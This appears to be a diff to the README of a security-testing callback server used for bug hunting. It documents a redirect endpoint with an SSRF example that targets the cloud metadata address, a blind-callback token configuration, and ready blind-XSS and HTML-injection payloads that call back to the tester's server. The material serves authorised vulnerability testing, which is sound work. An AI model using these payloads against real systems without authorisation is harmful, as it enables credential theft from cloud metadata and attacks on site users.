@@ -16,9 +16,42 @@ The `/redirect` endpoint is used to redirect a request to another server or endp
 curl -vv "http://server/redirect?url=http://169.254.169.254/latest/meta-data/"
 ```
 
-### Ping
-Sometimes, you simply need a page that responds with a certain body and headers. The `/ping` endpoint does exactly that. Here's a few examples.
+### Ping Pong
+Sometimes, you simply need a page that responds with a certain body and headers. The `/ping_pong` endpoint does exactly that. Here's a few examples.
 
 ```
-curl -vv "http://server/pingpong?&body=%3ch1%3eHello%3c/h1%3e"
+curl -vv "http://server/ping_pong?body=%3ch1%3eHello%3c/h1%3e"
 ```
+
+### Blind callbacks
+To figure out of an inaccessible system is executing your HTML or XSS payload, add an item the `callback_tokens` in `config.json`. The structure is shown below. This callback contains information where you injected your payload. This will help you identify the root cause of the vulnerability if you receive a callback. Every unique combination of parameter, host, port, path, and method is supposed to have its own `callback_token`.
+
+```
+{
+  "callback_tokens": {
+    "ee34a1791ab345f789": {
+      "host": "hackerone.com",
+      "port": 443,
+      "ssl": true,
+      "path": "/webhooks",
+      "parameter": "url",
+      "method": "POST"
+    }
+  }
+}
+```
+
+Depending on what type of vulnerability you want to test for, you have to construct a payload. See below for an example for HTML injections and XSS vulnerabilities. Then, submit the payload to the injection point. You'll see a log entry in `logs/access_log` when a request with that `callback_token` was triggered. Most of the time, I use `tail -f logs/access_log` to see if something triggered.
+
+**HTML injection**
+```
+<img src="https://server/pixel?callback_token=ee34a1791ab345f789" style="display:none;"/>
+```
+
+**Blind XSS**
+```
+<script src="https://server/collect?callback_token=ee34a1791ab345f789"></script>
+```
+
+### Starting another server
+The server listens on port `80`, `443`, `8080`, and `8443` by default. However, if you want to start another server on a different port, run `ruby app/server.rb -p :port`. To use SSL, append `-cert :cert.pem`. This is especially useful when a potential SSRF vulnerability only allows to connect on certain ports. Say bye to all the Apache and nginx configuration hacking!
